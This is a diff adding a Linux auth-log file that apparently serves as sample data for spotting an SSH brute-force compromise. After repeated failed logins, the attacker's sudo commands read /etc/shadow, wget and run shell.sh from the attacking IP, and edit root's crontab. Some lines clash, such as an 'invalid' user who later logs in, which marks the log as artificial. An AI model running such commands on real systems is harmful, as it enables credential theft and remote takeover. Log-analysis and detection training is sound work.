@@ -1,0 +1,101 @@
+Jun 14 08:00:01 web-prod-01 CRON[2841]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 14 08:00:01 web-prod-01 CRON[2841]: pam_unix(cron:session): session closed for user root
+Jun 14 08:02:17 web-prod-01 sshd[2903]: Accepted publickey for deploy from 10.0.1.50 port 52314 ssh2: RSA SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8
+Jun 14 08:02:17 web-prod-01 sshd[2903]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 14 08:05:01 web-prod-01 CRON[2950]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 14 08:05:01 web-prod-01 CRON[2950]: pam_unix(cron:session): session closed for user root
+Jun 14 08:07:33 web-prod-01 sshd[2903]: pam_unix(sshd:session): session closed for user deploy
+Jun 14 08:12:44 web-prod-01 sshd[3101]: Invalid user root from 45.33.32.156 port 44120
+Jun 14 08:12:44 web-prod-01 sshd[3101]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=root
+Jun 14 08:12:46 web-prod-01 sshd[3101]: Failed password for root from 45.33.32.156 port 44120 ssh2
+Jun 14 08:12:47 web-prod-01 sshd[3103]: Invalid user root from 45.33.32.156 port 44122
+Jun 14 08:12:49 web-prod-01 sshd[3103]: Failed password for root from 45.33.32.156 port 44122 ssh2
+Jun 14 08:12:50 web-prod-01 sshd[3105]: Invalid user root from 45.33.32.156 port 44124
+Jun 14 08:12:52 web-prod-01 sshd[3105]: Failed password for root from 45.33.32.156 port 44124 ssh2
+Jun 14 08:12:53 web-prod-01 sshd[3107]: Invalid user root from 45.33.32.156 port 44126
+Jun 14 08:12:55 web-prod-01 sshd[3107]: Failed password for root from 45.33.32.156 port 44126 ssh2
+Jun 14 08:12:56 web-prod-01 sshd[3109]: Invalid user root from 45.33.32.156 port 44128
+Jun 14 08:12:58 web-prod-01 sshd[3109]: Failed password for root from 45.33.32.156 port 44128 ssh2
+Jun 14 08:12:59 web-prod-01 sshd[3111]: Invalid user root from 45.33.32.156 port 44130
+Jun 14 08:13:01 web-prod-01 sshd[3111]: Failed password for root from 45.33.32.156 port 44130 ssh2
+Jun 14 08:13:02 web-prod-01 sshd[3113]: Invalid user root from 45.33.32.156 port 44132
+Jun 14 08:13:04 web-prod-01 sshd[3113]: Failed password for root from 45.33.32.156 port 44132 ssh2
+Jun 14 08:13:05 web-prod-01 sshd[3115]: Invalid user root from 45.33.32.156 port 44134
+Jun 14 08:13:07 web-prod-01 sshd[3115]: Failed password for root from 45.33.32.156 port 44134 ssh2
+Jun 14 08:13:08 web-prod-01 sshd[3117]: Invalid user root from 45.33.32.156 port 44136
+Jun 14 08:13:10 web-prod-01 sshd[3117]: Failed password for root from 45.33.32.156 port 44136 ssh2
+Jun 14 08:13:12 web-prod-01 sshd[3119]: Invalid user admin from 45.33.32.156 port 44138
+Jun 14 08:13:12 web-prod-01 sshd[3119]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=admin
+Jun 14 08:13:14 web-prod-01 sshd[3119]: Failed password for admin from 45.33.32.156 port 44138 ssh2
+Jun 14 08:13:15 web-prod-01 sshd[3121]: Invalid user admin from 45.33.32.156 port 44140
+Jun 14 08:13:17 web-prod-01 sshd[3121]: Failed password for admin from 45.33.32.156 port 44140 ssh2
+Jun 14 08:13:18 web-prod-01 sshd[3123]: Invalid user admin from 45.33.32.156 port 44142
+Jun 14 08:13:20 web-prod-01 sshd[3123]: Failed password for admin from 45.33.32.156 port 44142 ssh2
+Jun 14 08:13:21 web-prod-01 sshd[3125]: Invalid user admin from 45.33.32.156 port 44144
+Jun 14 08:13:23 web-prod-01 sshd[3125]: Failed password for admin from 45.33.32.156 port 44144 ssh2
+Jun 14 08:13:24 web-prod-01 sshd[3127]: Invalid user admin from 45.33.32.156 port 44146
+Jun 14 08:13:26 web-prod-01 sshd[3127]: Failed password for admin from 45.33.32.156 port 44146 ssh2
+Jun 14 08:13:27 web-prod-01 sshd[3129]: Invalid user admin from 45.33.32.156 port 44148
+Jun 14 08:13:29 web-prod-01 sshd[3129]: Failed password for admin from 45.33.32.156 port 44148 ssh2
+Jun 14 08:13:30 web-prod-01 sshd[3131]: Invalid user admin from 45.33.32.156 port 44150
+Jun 14 08:13:32 web-prod-01 sshd[3131]: Failed password for admin from 45.33.32.156 port 44150 ssh2
+Jun 14 08:13:33 web-prod-01 sshd[3133]: Invalid user admin from 45.33.32.156 port 44152
+Jun 14 08:13:35 web-prod-01 sshd[3133]: Failed password for admin from 45.33.32.156 port 44152 ssh2
+Jun 14 08:13:36 web-prod-01 sshd[3135]: Invalid user admin from 45.33.32.156 port 44154
+Jun 14 08:13:38 web-prod-01 sshd[3135]: Failed password for admin from 45.33.32.156 port 44154 ssh2
+Jun 14 08:13:39 web-prod-01 sshd[3137]: Invalid user admin from 45.33.32.156 port 44156
+Jun 14 08:13:41 web-prod-01 sshd[3137]: Failed password for admin from 45.33.32.156 port 44156 ssh2
+Jun 14 08:14:01 web-prod-01 CRON[3140]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 14 08:14:01 web-prod-01 CRON[3140]: pam_unix(cron:session): session closed for user root
+Jun 14 08:14:03 web-prod-01 sshd[3142]: Invalid user test from 45.33.32.156 port 44158
+Jun 14 08:14:03 web-prod-01 sshd[3142]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.33.32.156  user=test
+Jun 14 08:14:05 web-prod-01 sshd[3142]: Failed password for test from 45.33.32.156 port 44158 ssh2
+Jun 14 08:14:06 web-prod-01 sshd[3144]: Invalid user test from 45.33.32.156 port 44160
+Jun 14 08:14:08 web-prod-01 sshd[3144]: Failed password for test from 45.33.32.156 port 44160 ssh2
+Jun 14 08:14:09 web-prod-01 sshd[3146]: Invalid user test from 45.33.32.156 port 44162
+Jun 14 08:14:11 web-prod-01 sshd[3146]: Failed password for test from 45.33.32.156 port 44162 ssh2
+Jun 14 08:14:12 web-prod-01 sshd[3148]: Invalid user test from 45.33.32.156 port 44164
+Jun 14 08:14:14 web-prod-01 sshd[3148]: Failed password for test from 45.33.32.156 port 44164 ssh2
+Jun 14 08:14:15 web-prod-01 sshd[3150]: Invalid user test from 45.33.32.156 port 44166
+Jun 14 08:14:17 web-prod-01 sshd[3150]: Failed password for test from 45.33.32.156 port 44166 ssh2
+Jun 14 08:14:18 web-prod-01 sshd[3152]: Invalid user test from 45.33.32.156 port 44168
+Jun 14 08:14:20 web-prod-01 sshd[3152]: Failed password for test from 45.33.32.156 port 44168 ssh2
+Jun 14 08:14:21 web-prod-01 sshd[3154]: Invalid user test from 45.33.32.156 port 44170
+Jun 14 08:14:23 web-prod-01 sshd[3154]: Failed password for test from 45.33.32.156 port 44170 ssh2
+Jun 14 08:14:24 web-prod-01 sshd[3156]: Invalid user test from 45.33.32.156 port 44172
+Jun 14 08:14:26 web-prod-01 sshd[3156]: Failed password for test from 45.33.32.156 port 44172 ssh2
+Jun 14 08:14:27 web-prod-01 sshd[3158]: Invalid user test from 45.33.32.156 port 44174
+Jun 14 08:14:29 web-prod-01 sshd[3158]: Failed password for test from 45.33.32.156 port 44174 ssh2
+Jun 14 08:14:30 web-prod-01 sshd[3160]: Invalid user test from 45.33.32.156 port 44176
+Jun 14 08:14:32 web-prod-01 sshd[3160]: Failed password for test from 45.33.32.156 port 44176 ssh2
+Jun 14 08:14:45 web-prod-01 sshd[3165]: Failed password for root from 185.220.101.42 port 39201 ssh2
+Jun 14 08:14:47 web-prod-01 sshd[3167]: Failed password for root from 185.220.101.42 port 39203 ssh2
+Jun 14 08:14:50 web-prod-01 sshd[3169]: Failed password for root from 185.220.101.42 port 39205 ssh2
+Jun 14 08:14:55 web-prod-01 sshd[3171]: Invalid user admin from 45.33.32.156 port 44178
+Jun 14 08:14:57 web-prod-01 sshd[3171]: Failed password for admin from 45.33.32.156 port 44178 ssh2
+Jun 14 08:14:58 web-prod-01 sshd[3173]: Invalid user admin from 45.33.32.156 port 44180
+Jun 14 08:15:00 web-prod-01 sshd[3173]: Failed password for admin from 45.33.32.156 port 44180 ssh2
+Jun 14 08:15:01 web-prod-01 sshd[3175]: Invalid user admin from 45.33.32.156 port 44182
+Jun 14 08:15:03 web-prod-01 sshd[3175]: Failed password for admin from 45.33.32.156 port 44182 ssh2
+Jun 14 08:15:04 web-prod-01 sshd[3177]: Invalid user admin from 45.33.32.156 port 44184
+Jun 14 08:15:06 web-prod-01 sshd[3177]: Failed password for admin from 45.33.32.156 port 44184 ssh2
+Jun 14 08:15:07 web-prod-01 sshd[3179]: Invalid user admin from 45.33.32.156 port 44186
+Jun 14 08:15:09 web-prod-01 sshd[3179]: Failed password for admin from 45.33.32.156 port 44186 ssh2
+Jun 14 08:15:01 web-prod-01 CRON[3180]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Jun 14 08:15:01 web-prod-01 CRON[3180]: pam_unix(cron:session): session closed for user www-data
+Jun 14 08:15:22 web-prod-01 sshd[3190]: Accepted password for admin from 45.33.32.156 port 44188 ssh2
+Jun 14 08:15:22 web-prod-01 sshd[3190]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jun 14 08:15:23 web-prod-01 systemd-logind[612]: New session 47 of user admin.
+Jun 14 08:15:38 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jun 14 08:15:45 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://45.33.32.156:8080/shell.sh -O /tmp/shell.sh
+Jun 14 08:15:52 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod +x /tmp/shell.sh
+Jun 14 08:15:58 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/tmp/shell.sh
+Jun 14 08:16:05 web-prod-01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/crontab -e
+Jun 14 08:16:12 web-prod-01 CRON[3210]: (root) RELOAD (crontabs/root)
+Jun 14 08:16:30 web-prod-01 sshd[3215]: Failed password for root from 192.168.1.105 port 50122 ssh2
+Jun 14 08:16:33 web-prod-01 sshd[3217]: Accepted publickey for deploy from 10.0.1.50 port 52480 ssh2
+Jun 14 08:16:33 web-prod-01 sshd[3217]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 14 08:20:01 web-prod-01 CRON[3230]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 14 08:20:01 web-prod-01 CRON[3230]: pam_unix(cron:session): session closed for user root
+Jun 14 08:25:01 web-prod-01 CRON[3245]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun 14 08:25:01 web-prod-01 CRON[3245]: pam_unix(cron:session): session closed for user root
